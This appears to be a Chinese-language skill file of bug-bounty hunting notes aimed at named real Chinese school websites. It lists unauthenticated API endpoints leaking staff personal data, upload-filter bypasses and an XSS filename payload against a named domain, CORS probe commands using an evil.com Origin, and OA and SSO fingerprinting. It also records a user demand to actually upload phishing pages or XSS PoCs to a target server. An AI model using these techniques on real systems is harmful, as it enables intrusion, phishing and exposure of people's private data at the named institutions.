### 金智教育 ehall 未授权API (2026-05-20 实测)
以下接口无需登录即可访问(部分学校配置不同):
- `/jsonp/serviceCenterData.json` — 服务目录(应用ID/名称/分类)
- `/jsonp/userInfo.json` — 站点结构/菜单
- `/jsonp/school.json` — 学校配置(schoolId/authserver地址)
- `/jsonp/appIntroduction.json?appId=xxx` — **泄露教职工PII**(姓名/电话/办公室)
- `/jsonp/userSearchHistory.json`, `/jsonp/myAppService.json` 等

**注意**: 不同学校ehall配置不同，有些返回404或302。需逐个测试。

### 文件上传未授权利用模式 (lycvc.linyi.cn 实战)
发现模式: `/api/cms/upload?siteId=xxx` 无需认证
- siteId可从页面JS中提取: `var lysid="1930900465347256321"`
- 可上传HTML/JS/SWF/XML等可执行文件
- PHP/JSP被拦截
- 双扩展名绕过: `filename=test.html.jpg`
- 大小写绕过: `filename=test.HTML`
- 文件名XSS: `filename=<script>alert(1)</script>.html`
- 无速率限制

**攻击演示要求**: 用户要求实际上传钓鱼页面/XSS PoC到目标服务器证明危害

### 报告格式要求 (用户反复强调)
1. 每个漏洞必须有可直接复制执行的curl命令
2. 响应必须包含实际返回数据(不是理论推断)
3. 需要攻击演示URL证明实际危害
4. 补天格式: 标题/域名/类型/等级/行业/地址/URL/详情/复现/影响/修复
5. 地址精确到区, 行业按主营业务分类

### CORS漏洞检测
```bash
curl -sk -D- "https://target/api/xxx" -H "Origin: https://evil.com" | grep -i access-control
# 如果返回 Origin + Credentials:true = 高危
```

### CORS `*` with Custom Auth Token Headers (2026-05-28 SAIF实战)
当 `Access-Control-Allow-Origin: *` 与 Allow-Headers 中包含自定义认证头（Ttoken, Stoken, Mtoken, Appid 等）时，属于特殊CORS配置缺陷。与标准 CORS `*` 的区别是 Allow-Headers 明确包含 Cookie 和自定义认证头。
测试：`curl -sk -D- "https://TARGET/" -H "Origin: https://evil.com" | grep -i access-control`
报告角度：如果能证明已登录状态下可跨域读取敏感数据，按中危提交。

### 致远OA版本检测
```bash
curl -sk "http://oa.target/seeyon/index.jsp" | grep -i "title\|version\|V[0-9]"
# 版本在CSS/JS路径中: ?V=V8_0SP1_201101_29551
# 管理后台: /seeyon/management/index.jsp
```

### SSO内部路径泄露 (2026-05-28 SAIF实战)
SSO系统在返回404错误时可能泄露内部服务架构：
```bash
curl -sk "https://sso.TARGET/sso/apis/v2/open/code/SMS"
# 响应: {"path":"/sso-apis-v3/apis/v2/open/code/SMS"}
# 泄露内部服务名: sso-apis-v3
```
测试方法：访问不存在的API路径，检查错误响应中的path字段是否包含内部服务名。
报告角度：低危信息泄露，暴露后端微服务架构。

## 参考文件
- `references/ehall-jinzhijiaoyu-api.md` — 金智教育ehall未授权API参考
- `references/batch-scan-workflow.md` — 批量教育目标扫描流程
- `references/file-upload-exploitation.md` — 自研CMS文件上传利用模式

## 相关Skill
- `src-vuln-hunting` — SRC漏洞挖掘全流程
- `web-pentest-fast` — Web渗透快速流程
- `auto-recon-lowhanging` — 自动化初始侦察
- `nginx-spa-fallback-false-positive` — SPA Fallback误报检测

## 参考文件 (references/)
- `references/bzuu-slow-target-execution-and-final-gate-20260525.md` — BZUU 续挖慢目标执行与最终提交门禁：避免长时间全缓冲批量 curl 脚本卡死无产物；改用单请求/小批即时落盘复核；记录 getAppConfig/CORS 仍为中危边界、rhpt/ekta/ektm 敏感接口 token 保护，以及 go-fastdfs/Swagger/JS baseURL 不应重复提交。
- `references/bzuu-rhpt-swagger-logic-negative-20260524.md` — 亳州学院 BZUU 智慧校园 rhpt 微服务 Swagger 续挖负证据包：记录 `/zhxyApi/swagger-resources` 暴露 rhpt-interface/workhall/applets/workform/system API 文档、必须保留 `/zhxyApi` 网关前缀获取 `/rhpt-*/v2/api-docs`；梳理工资/成绩/通讯录/身份证校验/getAccessToken/数据源接口为高价值逻辑入口，但实测敏感接口均 `Token失效`、`getAccessToken` 需真实 appId/appSecret、fileServer upload 属旧 go-fastdfs 根因补充且强制下载；无 token/凭据/IDOR/真实数据前不建议提交。
- `references/bzuu-followup-20260525.md` — 亳州学院 BZUU 2026-05-25 续挖边界：记录 rhpt/getAppConfig 初始密码规则泄露仍可复现但需防重复提交、ektm/ekta 第二课堂 API baseURL 与登录失败过滤、jyxt ASP.NET 短信/重置正常校验失败、go-fastdfs 仍可上传但属历史同根因补充证据；给出未来只在 RCE/SQLi/认证绕过/真实未授权数据/IDOR/新上传影响时才提交的门槛。
- `references/cqnu-round4-yscs-zsxt-negative-20260526.md`：重庆师范大学 CQNU 第四轮 yscs/zsxt 负证据包；覆盖 yscs 找回密码 getType 公开配置 + CORS、登录错误分支、猜测 getPublicKey/captcha/checkAccount/sendCode/upload/download/tenant 接口 404、zsxt 录取查询/通知书路径空响应，并明确只有补到登录态敏感跨域读取、真实考生数据、验证码发送、上传下载或认证绕过时才提交。
- `references/cqnu-admission-cors-weak-auth-negative-20260526.md` — 重庆师范大学招生系统 CORS 任意 Origin + Credentials、录取查询/通知书接口弱鉴权的负证据门禁案例；强调公开拟录取名单和脱敏身份证只能作为低影响样本来源，若查询仍只返回“没有录取信息”、通知书接口仅返回壳页面/模板占位字段，则不建议提交独立报告，需补到真实录取结果/EMS/通知书/PII 或跨域读取敏感响应才提交。
- `references/wxnc-vsb-openapp-formquery-negative-20260524.md` — 无锡师范高专 `wxnc.edu.cn` / `zsjy.wxnc.edu.cn` VSB9 OpenApp FormQuery 负证据包：记录 4 个招生查询模板（成绩录取、缴款码、快递单号、准考证）、正确的 OpenApp 元数据请求头（`Authorization: tourist` + `session` + `owner` + `appId`）、`data/get/info` 验证码查询边界、上传 403、常见 ehall/CAS/OA/WebVPN 子域不可达；只有验证码绕过、IDOR/枚举返回真实考生数据、公开上传成功或独立高价值资产可达时才提交。
- `references/ehall-jinzhi-api-enumeration.md` — 金智教育(ehall) API未授权访问枚举方法、公开端点列表、appId枚举、实战案例
- `references/education-testing-workflow.md` — 教育测试工作流
- `references/batch-edu-scan-20260520.md` — 批量教育目标扫描结果、域名解析成功率、子域名枚举、新WAF类型
- `references/batch-edu-scan-20260520-v2.md` — 扩展批量扫描(30+学校)、新CMS指纹、域名出售检测、第三方SaaS识别
